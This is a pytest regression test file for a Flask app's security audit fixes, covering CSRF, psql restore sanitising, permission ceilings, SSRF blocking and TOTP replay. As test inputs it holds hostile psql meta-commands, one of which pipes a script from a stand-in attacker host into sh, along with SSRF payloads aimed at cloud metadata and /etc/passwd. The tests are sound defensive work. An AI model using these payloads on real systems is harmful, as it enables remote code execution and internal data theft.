# -*- coding: utf-8 -*-
"""Regression tests for the security audit fixes (docs/audit/security.md)."""
import json
import os

import pyotp
import pytest
from flask import g


def _login(client, user):
    with client.session_transaction() as sess:
        sess["_user_id"] = user.login_id
        sess["_fresh"] = True


def _fresh_request_state():
    # The session-scoped app context shares g across requests in tests;
    # drop the cached user so each request re-authenticates from its cookies.
    g.pop("_login_user", None)
    g.pop("csrf_token", None)


# ---------------------------------------------------------------- H1 CSRF
class TestCsrf:
    @pytest.fixture(autouse=True)
    def _csrf_on(self, app, monkeypatch):
        monkeypatch.setitem(app.config, "WTF_CSRF_ENABLED", True)

    def test_mutation_without_token_is_rejected(self, logged_in_client):
        client, _ = logged_in_client
        resp = client.post("/api/v1/auth/logout")
        assert resp.status_code == 400
        assert "CSRF" in json.loads(resp.data)["message"]

    def test_mutation_with_token_is_accepted(self, logged_in_client):
        client, _ = logged_in_client
        _fresh_request_state()
        token = json.loads(client.get("/api/v1/auth/csrf").data)["csrf_token"]
        _fresh_request_state()
        # The test client uses https (PREFERRED_URL_SCHEME), so WTF_CSRF_SSL_STRICT
        # also wants a same-origin Referer, as browsers send for the SPA.
        resp = client.post("/api/v1/auth/logout", headers={
            "X-CSRFToken": token, "Referer": "https://localhost/",
        })
        assert resp.status_code == 200

    def test_api_key_requests_skip_csrf(self, app, make_user):
        user = make_user(username="csrf_apikey")
        client = app.test_client()
        resp = client.post("/api/v1/auth/logout", headers={"Authorization": user.api_key})
        assert resp.status_code == 200

    def test_remember_cookie_flags(self, app):
        assert app.config["REMEMBER_COOKIE_SAMESITE"]
        assert app.config["REMEMBER_COOKIE_HTTPONLY"] is True


# -------------------------------------------------------- H2 restore psql
class TestRestoreRejectsMetaCommands:
    def _sanitize(self, raw: bytes) -> str:
        from onani.services.maintenance import _sanitize_postgres_restore_sql
        return _sanitize_postgres_restore_sql(raw).decode("utf-8")

    @pytest.mark.parametrize("payload", [
        b"SELECT 1;\n\\! curl attacker/x.sh | sh\n",
        b"SELECT 1; \\! id\n",
        b"\\o |id\n",
        b"\\copy users to program 'id'\n",
        # fake COPY inside a string literal must not open a data block
        b"SELECT 'x\nCOPY public.users (id) FROM stdin;\n';\n\\! id\n\\.\n",
        # fake COPY inside a block comment
        b"/*\nCOPY public.users (id) FROM stdin;\n*/\n\\! id\n\\.\n",
        # unbalanced quoted identifier on the COPY line
        b'COPY "users FROM stdin;\n" ;\n\\! id\n\\.\n',
    ])
    def test_meta_commands_rejected(self, payload):
        from onani.services.maintenance import MaintenanceError
        with pytest.raises(MaintenanceError):
            self._sanitize(payload)

    def test_copy_data_and_pg_dump_restrict_allowed(self):
        raw = (
            b"\\restrict AbC123\n"
            b"SET statement_timeout = 0;\n"
            b"COPY public.users (id, email) FROM stdin;\n"
            b"1\t\\N\n"
            b"\\.\n"
            b"SELECT 'it''s';\n"
            b"\\unrestrict AbC123\n"
        )
        out = self._sanitize(raw)
        assert "1\t\\N" in out
        assert "restrict" not in out

    def test_restore_endpoint_rejects_upload(self, admin_client, app, monkeypatch):
        """The route surfaces the rejection as a 400 (postgres path forced)."""
        import io
        from onani.services import maintenance

        monkeypatch.setattr(
            maintenance, "_restore_postgres_backup",
            lambda b: pytest.fail("psql must not run"),
        )
        monkeypatch.setattr(
            type(maintenance.db.engine.url), "get_backend_name", lambda self: "postgresql",
        )
        client, _ = admin_client
        resp = client.post(
            "/api/v1/admin/database/restore",
            data={"confirm": "RESTORE", "file": (io.BytesIO(b"\\! id\n"), "x.sql")},
            content_type="multipart/form-data",
        )
        assert resp.status_code == 400


# ------------------------------------------- H3/H4 permission ceilings
class TestPermissionCeiling:
    def test_cannot_grant_bits_caller_lacks(self, client, make_user):
        from onani.models import UserPermissions, UserRoles
        mod = make_user(
            username="ceiling_mod", role=UserRoles.MODERATOR,
            permissions=UserPermissions.DEFAULT | UserPermissions.EDIT_USERS,
        )
        target = make_user(username="ceiling_target")
        _login(client, mod)

        resp = client.put("/api/v1/admin/user", json={
            "user_id": target.id, "permissions": int(UserPermissions.ADMINISTRATION),
        })
        assert resp.status_code == 403

        _fresh_request_state()
        resp = client.put("/api/v1/admin/user", json={
            "user_id": target.id, "permissions": int(UserPermissions.DEFAULT),
        })
        assert resp.status_code == 200

    def test_admin_cannot_create_owner(self, admin_client):
        client, _ = admin_client
        resp = client.post("/api/v1/admin/users", json={
            "username": "sneaky_owner", "password": "password123", "role": "OWNER",
        })
        assert resp.status_code == 403

    def test_admin_cannot_promote_to_owner_or_admin(self, admin_client, make_user):
        client, _ = admin_client
        target = make_user(username="promote_target")
        for role in ("OWNER", "ADMIN"):
            _fresh_request_state()
            resp = client.put("/api/v1/admin/users", json={"id": target.id, "role": role})
            assert resp.status_code == 403
        _fresh_request_state()
        resp = client.put("/api/v1/admin/users", json={"id": target.id, "role": "MODERATOR"})
        assert resp.status_code == 200


# ------------------------------------------------- H7 library allowlist
class TestLibraryAllowlist:
    def test_path_outside_roots_rejected(self, admin_client):
        client, _ = admin_client
        for i, path in enumerate((os.path.abspath(os.sep), os.path.abspath(os.sep + "etc"))):
            _fresh_request_state()
            resp = client.post("/api/v1/libraries", json={"name": f"bad{i}", "path": path})
            assert resp.status_code == 400
            assert "LIBRARY_ROOTS" in json.loads(resp.data)["message"]

    def test_existing_library_outside_roots_not_served(self, app, db, make_user, tmp_path, monkeypatch):
        from onani.models import ExternalLibrary
        owner = make_user(username="lib_owner_sec")
        (tmp_path / "a.png").write_bytes(b"x")
        lib = ExternalLibrary(name="legacy_sec", path=str(tmp_path), enabled=True, owner_id=owner.id)
        db.session.add(lib)
        db.session.commit()
        client = app.test_client()
        assert client.get("/external/legacy_sec/a.png").status_code == 200
        monkeypatch.setitem(app.config, "LIBRARY_ROOTS", [os.path.join(str(tmp_path), "elsewhere")])
        assert client.get("/external/legacy_sec/a.png").status_code == 404


# ----------------------------------------------------------------- M1 SSRF
class TestSsrf:
    @pytest.mark.parametrize("url", [
        "http://127.0.0.1/x.png",
        "http://localhost/x.png",
        "http://10.0.0.5/x.png",
        "http://192.168.1.1/x.png",
        "http://169.254.169.254/latest/meta-data",
        "http://[::1]/x.png",
        "file:///etc/passwd",
        "gopher://example.com/",
    ])
    def test_private_or_bad_scheme_rejected(self, url):
        from onani.controllers.utils import assert_public_url
        with pytest.raises(ValueError):
            assert_public_url(url)

    def test_public_ip_allowed(self):
        from onani.controllers.utils import assert_public_url
        assert_public_url("https://1.1.1.1/x.png")

    def test_import_route_rejects_private(self, logged_in_client):
        client, _ = logged_in_client
        resp = client.post("/api/v1/import", json={"url": "http://127.0.0.1:5432/x.png"})
        assert resp.status_code == 400

    def test_download_file_rejects_private(self):
        import onani.importers._utils as u
        with pytest.raises(ValueError):
            u.download_file("http://127.0.0.1/x.png")


# ------------------------------------ M2 password change kills sessions
class TestPasswordChangeInvalidatesSessions:
    def test_other_sessions_logged_out(self, app, make_user):
        user = make_user(username="pwchange_user", password="oldpassword")
        a, b = app.test_client(), app.test_client()
        _login(a, user)
        _login(b, user)

        resp = a.put("/api/v1/profile", json={
            "current_password": "oldpassword", "new_password": "newpassword123",
        })
        assert resp.status_code == 200

        _fresh_request_state()
        assert b.get("/api/v1/auth/me").status_code == 401
        _fresh_request_state()
        assert a.get("/api/v1/auth/me").status_code == 200


# --------------------------------------------------------- L1-L3 TOTP
class TestTotp:
    def test_code_cannot_be_replayed(self, make_user, db):
        user = make_user(username="otp_replay")
        code = pyotp.TOTP(user.otp_token).now()
        assert user.check_otp(code) is True
        assert user.check_otp(code) is False

    def test_enable_via_profile_put_rejected(self, logged_in_client):
        client, user = logged_in_client
        resp = client.put("/api/v1/profile", json={"otp_enabled": True})
        assert resp.status_code == 400
        assert user.otp_enabled is False

    def test_secret_hidden_once_enabled(self, logged_in_client, db):
        client, user = logged_in_client
        user.otp_enabled = True
        db.session.commit()
        try:
            data = json.loads(client.get("/api/v1/profile/otp").data)
            assert data == {"enabled": True}
        finally:
            user.otp_enabled = False
            db.session.commit()


# ------------------------------------------------------- M4 / M6 / L8
class TestMisc:
    def test_thumbnail_sizes_snap_to_presets(self):
        from onani.services.files import parse_thumbnail_size
        assert {parse_thumbnail_size(str(n)) for n in range(16, 2049)} == {50, 150, 350, 500}

    def test_hidden_post_not_served_by_id(self, client, make_post, db):
        post = make_post()
        post.hidden = True
        db.session.commit()
        assert client.get(f"/api/v1/post?id={post.id}").status_code == 404


class TestSsrfRedirects:
    class _Resp:
        def __init__(self, status, location=None):
            self.status_code = status
            self.headers = {"location": location} if location else {}

    class _Session:
        def __init__(self, responses):
            self.responses = list(responses)
            self.urls = []

        def get(self, url, **kw):
            assert kw.get("allow_redirects") is False
            self.urls.append(url)
            return self.responses.pop(0)

    def _public_only(self, monkeypatch):
        import onani.importers._utils as u

        def check(url):
            if "127.0.0.1" in url:
                raise ValueError("private")
        monkeypatch.setattr(u, "assert_public_url", check)
        return u

    def test_redirect_to_private_blocked(self, monkeypatch):
        u = self._public_only(monkeypatch)
        s = self._Session([self._Resp(302, "http://127.0.0.1/admin")])
        with pytest.raises(ValueError):
            u._safe_get(s, "https://example.com/a", {})
        assert s.urls == ["https://example.com/a"]

    def test_public_redirect_followed(self, monkeypatch):
        u = self._public_only(monkeypatch)
        s = self._Session([self._Resp(301, "/b"), self._Resp(200)])
        assert u._safe_get(s, "https://example.com/a", {}).status_code == 200
        assert s.urls == ["https://example.com/a", "https://example.com/b"]

    def test_redirect_loop_capped(self, monkeypatch):
        u = self._public_only(monkeypatch)
        s = self._Session([self._Resp(302, "/x")] * 20)
        with pytest.raises(ValueError):
            u._safe_get(s, "https://example.com/a", {})


class TestScheduledImportCookies:
    def test_cookies_encrypted_at_rest(self, app, db):
        from onani.models.scheduled_import import ScheduledImport

        task = ScheduledImport(url="https://example.com", cookies="secret=1")
        db.session.add(task)
        db.session.commit()
        raw = db.session.execute(
            db.text("SELECT cookies FROM scheduled_imports WHERE id=:i"), {"i": task.id}
        ).scalar()
        assert "secret" not in raw
        assert task.cookies == "secret=1"

    def test_legacy_plaintext_still_readable(self, app, db):
        from onani.models.scheduled_import import ScheduledImport

        task = ScheduledImport(url="https://example.com")
        task._cookies = "legacy=1"
        assert task.cookies == "legacy=1"
